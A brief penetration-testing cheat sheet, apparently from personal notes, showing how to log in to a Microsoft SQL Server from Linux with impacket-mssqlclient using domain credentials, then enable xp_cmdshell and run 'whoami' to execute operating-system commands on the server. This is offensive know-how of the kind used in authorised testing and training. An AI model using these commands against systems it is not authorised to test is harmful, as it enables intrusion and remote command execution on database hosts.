# From Linux 
## Using impacket-mssqlclient
```shell
impacket-mssqlclient  'Domain/user':'Password'@<SQLServer-IP> -dc-ip <DC-IP> -windows-auth
```
Or 
```shell
impacket-mssqlclient <user>:'Password'@<SQLServer-IP> -windows-auth
```
Enable execute commands
```shell
enable_xp_cmdshell
xp_cmdshell "whoami"
```


